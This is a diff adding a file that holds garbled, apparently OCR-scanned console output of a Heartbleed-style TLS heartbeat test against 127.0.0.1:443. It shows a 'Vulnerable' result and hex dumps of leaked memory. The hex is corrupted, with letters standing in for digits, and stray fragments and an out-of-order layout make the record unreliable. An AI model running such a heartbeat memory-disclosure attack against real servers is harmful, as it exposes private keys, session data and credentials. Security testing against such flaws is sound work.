@@ -1,0 +1,39 @@
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+XY.Z.4,].}.~...
+02c0: 00 00 49 00 OB 00 04 03 00 01 02 00 0A 00 34 00
+i
+4,
+02d0: 32 00 OE 00 OD 00 19 00 OB 00 OC 00 18 00 09 00
+0300: 10 00 11 00 23 00 00 00 OF 00 01 01 00 00 00 00
+oF assssesen
+ObdO: 00 00 00 00 00 00 00 00 00 12 7D 01 00 10 00 02
+sessessee draco
+[-] Closing connection
+[-] Connecting to 127.0.0.1:443 using TLSv1.2
+[-] Sending ClientHello
+[-] ServerHello received
+[-] Sending Heartbeat
+[Vulnerable] Heartbeat response was 16384 bytes instead of 3!
+127.0.0.1:443 is vulnerable over TLSv1.2
+[-] Displaying response (lines consisting entirely of null bytes are
+removed):
+0000: 02 FF FF 08 03 03 53 48 73 FO 7C CA C1 D9 02 04 ......
+SHs]|.....
+0010: F2 1D 2D 49 F5 12 BF 40 1B 94 D9 93 E4 C4 F4 FO ..-
+0020: DO 42 CD 44 A2 59 00 02 96 00 00 00.01 00 02 00
+0060: 1B 00 1C 00 1D 00 1E 00 1F 00 20 00 21 00 22 OO
+..........
+I"
+0070: 23 00 24 00 25 00 26 00 27 00 28 00 29 00 2A 00
+#.$.%.8.(.).*.
+0080: 2B 00 2C 00 2D 00 2E 00 2F 00 30 00 31 00 32 00 +.,.-
+/ 0.1.2.
+0090: 33 00 34 00 35 00 36 00 37 00 38 00 39 00 3A 00
+3.4.5.6.7.8.9.:.
+00a0: 3B 00 3C 00 3D 00 3E 00 3F 00 40 00 41 00 42 00
+<=.>.?,@.A.B.
+OOb0: 43 00 44 00 45
